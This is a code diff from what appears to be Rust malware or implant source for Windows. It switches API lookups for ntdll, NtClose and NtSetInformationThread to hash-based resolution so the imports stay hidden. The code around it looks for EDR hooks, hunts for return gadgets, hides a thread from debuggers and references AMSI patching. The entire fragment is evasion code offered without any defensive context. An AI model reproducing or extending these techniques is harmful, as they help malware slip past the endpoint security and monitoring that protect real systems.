@@ -36,9 +36,9 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
             // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3) 
             // gadget without hitting false positives in complex instructions.
             let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
-            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
+            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
             if !ntdll.is_null() {
-                let nt_close = winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("NtClose").as_ptr() as _);
+                let nt_close = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NtClose).unwrap_or(0) as _;
                 if !nt_close.is_null() {
                     let p = nt_close as *const u8;
                     // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
@@ -147,9 +147,9 @@ pub unsafe fn patch_amsi() {}
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
-        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _);
+        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
         if !ntdll.is_null() {
-            let func = winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("NtSetInformationThread").as_ptr() as _);
+            let func = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NtSetInformationThread).unwrap_or(0) as _;
             if !func.is_null() {
                 let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
